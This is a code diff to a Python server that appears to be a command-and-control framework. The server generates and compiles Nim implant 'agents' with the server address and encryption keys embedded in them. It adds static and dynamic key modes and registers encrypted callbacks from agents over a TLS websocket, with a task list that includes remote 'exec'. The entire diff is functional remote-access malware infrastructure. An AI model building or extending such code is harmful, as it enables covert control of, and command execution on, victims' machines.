@@ -19,11 +19,14 @@ from collections import deque
 from nacl.public import PublicKey, PrivateKey, Box 
 
 agents = []
-ids = []
+unconnected = {}
+keys = []
 new_task = {}
 websocket_servers = {}
 shell = 0
 active_count = 0
+static_keys = False
+dynamic_keys = False
 
 task_list = [{"code": 0, "name":"kill", "data": ""},
              {"code": 1, "name":"exec", "data": ""},
@@ -37,7 +40,12 @@ srvpubkey = ''
 with open('resources/config.json') as f:
   conf = json.load(f)
 
-ids = conf["ids"]
+unconnected = conf["unconnected"]
+
+if conf["static_keys"]:
+  static_keys = True
+else:
+  dynamic_keys = True
 
 if conf["secret_key"] == "":
   srvseckey = PrivateKey.generate()
@@ -55,14 +63,14 @@ ssl_context.load_cert_chain(certfile="resources/certs/cert.pem", keyfile="resour
 
 def encrypt(input, pubkey):
   input = input.strip()
-  box = Box(srvseckey, pubkey)
+  box = Box(srvseckey, PublicKey(bytes.fromhex(pubkey)))
   plaintext = input.encode()
   ciphertext = box.encrypt(plaintext)
   return ciphertext.hex().upper()
 
 def decrypt(input, pubkey):
   input = input.strip()
-  box = Box(srvseckey, pubkey)
+  box = Box(srvseckey, PublicKey(bytes.fromhex(pubkey)))
   ciphertext = bytes.fromhex(input)
   return box.decrypt(ciphertext).decode()
 
@@ -70,6 +78,17 @@ def mkagent(platform, ip, port, id):
   count = 1
   file = id + '.nim'
   original = file
+
+  if static_keys:
+    with open('resources/agents/agent_static.nim') as f:
+      code = f.read()
+
+  elif dynamic_keys:
+    with open('resources/agents/agent_dynamic.nim') as f:
+      code = f.read()
+
+  else:
+    return
 
   while os.path.isfile('resources/agents/' + file):
     count += 1
@@ -80,13 +99,16 @@ def mkagent(platform, ip, port, id):
     id = re.sub('\.nim$', '', file)
     add_output('Agent renamed: ' + original + ' -> ' + id + '\n', True)
 
-  with open('resources/agents/agent.nim') as f:
-    code = f.read()
-
   code = re.sub('ADDRESS', ip, code)
   code = re.sub('PORT', port, code)
   code = re.sub('AGENTID', id, code)
   code = re.sub('SERVERPUBLICKEY', srvpubkey.encode().hex(), code)
+
+  if static_keys:
+    agentseckey = PrivateKey.generate()
+    agentpubkey = agentseckey.public_key.encode().hex()
+    agentseckey = agentseckey.encode().hex()
+    code = re.sub('AGENTSECRETKEY', agentseckey, code)
 
   with open('resources/agents/' + file, 'w') as f:
     f.write(code)
@@ -100,15 +122,18 @@ def mkagent(platform, ip, port, id):
                  stderr=subprocess.DEVNULL)
   add_output('Done')
 
-  id = id.encode().hex().upper()
-  ids.append(id)
-
   with open('resources/config.json') as f:
     conf = json.load(f)
 
   uri = ip + ':' + port
   conf["uris"].append(uri)
-  conf["ids"].append(id)
+
+  if static_keys:
+    unconnected[id] = agentpubkey
+  else:
+    unconnected[id] = 'dynamic'
+
+  conf["unconnected"] = unconnected
 
   with open('resources/config.json', 'w') as f:
     json.dump(conf, f)
@@ -425,15 +450,26 @@ async def ws(websocket, path):
       if receive:
         try:
           callback = await websocket.recv()
-          for id in ids:
-            if callback.startswith(id):
-              ids.remove(id)
-              pubkey = PublicKey(bytes.fromhex(callback[len(id):]))
-              id = bytes.fromhex(id).decode()
-              add_output('Callback: ' + id + '\n', True)
-              agent = add_agent(id, websocket.local_address[1], pubkey)
-              agents.append(agent)
-              receive = False
+          if static_keys:
+            for id in unconnected:
+              message = decrypt(callback, unconnected[id])
+              if message == id:
+                pubkey = unconnected[id]
+                unconnected.pop(id, None)
+                add_output('Callback: ' + id + '\n', True)
+                agent = add_agent(id, websocket.local_address[1], pubkey)
+                agents.append(agent)
+                receive = False
+          elif dynamic_keys:
+            for id in unconnected:
+              hex_id = id.encode().hex().upper()
+              if callback.startswith(hex_id):
+                pubkey = callback[len(hex_id):]
+                unconnected.pop(id, None)
+                add_output('Callback: ' + id + '\n', True)
+                agent = add_agent(id, websocket.local_address[1], pubkey)
+                agents.append(agent)
+                receive = False
         except:
           pass
       else:
